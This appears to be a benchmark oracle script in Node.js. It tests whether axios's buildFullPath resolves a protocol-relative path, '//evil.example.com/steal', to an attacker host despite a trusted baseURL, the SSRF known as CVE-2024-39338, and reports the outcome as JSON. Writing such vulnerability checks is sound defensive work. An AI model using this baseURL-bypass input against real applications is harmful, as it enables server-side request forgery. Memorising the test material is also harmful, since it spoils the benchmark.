'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function report(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function resolveHost(fullPath) {
  try {
    if (typeof fullPath !== 'string') return null;
    if (fullPath.startsWith('//')) {
      return new URL('https:' + fullPath).hostname;
    }
    return new URL(fullPath).hostname;
  } catch (e) {
    return null;
  }
}

function main() {
  const marker = 'axios_ssrf_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  const tmpMarkerFile = path.join(os.tmpdir(), marker + '.txt');

  let buildFullPath;
  try {
    const mod = require('axios/unsafe/core/buildFullPath.js');
    buildFullPath = mod && (mod.default || mod);
  } catch (e) {
    report({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
    return;
  }

  if (typeof buildFullPath !== 'function') {
    report({ operation_completed: false, exploit_succeeded: false, evidence: 'buildFullPath is not a function on resolved module' });
    return;
  }

  try {
    fs.writeFileSync(tmpMarkerFile, marker, 'utf8');
  } catch (e) {
    report({ operation_completed: false, exploit_succeeded: false, evidence: 'fixture setup failed: ' + String(e && e.message) });
    return;
  }

  const trustedBase = 'https://safe.example.com/api/';

  // --- Benign operation: relative path combined with trusted baseURL, absolute URLs disallowed ---
  let benignResult;
  try {
    benignResult = buildFullPath(trustedBase, '/resource', false);
  } catch (e) {
    report({ operation_completed: false, exploit_succeeded: false, evidence: 'benign buildFullPath call threw: ' + String(e && e.message) });
    return;
  }

  const benignHost = resolveHost(benignResult);

  if (benignHost !== 'safe.example.com') {
    report({ operation_completed: false, exploit_succeeded: false, evidence: 'benign buildFullPath did not resolve to expected host; got ' + String(benignResult) });
    return;
  }

  // Benign operation succeeded; operation_completed may become true now.
  const operation_completed = true;

  // --- Malicious operation: protocol-relative URL supplied as request path, allowAbsoluteUrls=false ---
  const maliciousPath = '//evil.example.com/steal';

  let maliciousResult;
  try {
    maliciousResult = buildFullPath(trustedBase, maliciousPath, false);
  } catch (e) {
    report({ operation_completed, exploit_succeeded: false, evidence: 'malicious buildFullPath call threw (treated as blocked): ' + String(e && e.message) });
    return;
  }

  const maliciousHost = resolveHost(maliciousResult);

  let exploit_succeeded = false;
  let evidence;

  if (maliciousHost === 'evil.example.com') {
    exploit_succeeded = true;
    evidence = 'buildFullPath("' + trustedBase + '", "' + maliciousPath + '", false) returned "' + String(maliciousResult) + '" which resolves to host \'evil.example.com\' (expected pinned host: safe.example.com) even though allowAbsoluteUrls=false - protocol-relative URL bypassed configured baseURL, confirming SSRF (CVE-2024-39338). Marker: ' + marker;
  } else if (maliciousHost === 'safe.example.com' || (typeof maliciousResult === 'string' && maliciousResult.indexOf('evil.example.com') === -1)) {
    exploit_succeeded = false;
    evidence = 'buildFullPath treated the protocol-relative path as relative to the configured baseURL (allowAbsoluteUrls=false); result "' + String(maliciousResult) + '" does not resolve to the attacker host. Protocol-relative SSRF bypass not present. Marker: ' + marker;
  } else {
    exploit_succeeded = false;
    evidence = 'buildFullPath produced an unexpected result "' + String(maliciousResult) + '" (resolved host: ' + String(maliciousHost) + '); treated as not exploited. Marker: ' + marker;
  }

  try {
    fs.unlinkSync(tmpMarkerFile);
  } catch (e) {
    // non-fatal cleanup failure, ignore
  }

  report({ operation_completed, exploit_succeeded, evidence });
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed: false, exploit_succeeded: false, evidence: 'unexpected top-level exception: ' + String(e && e.message) }));
}
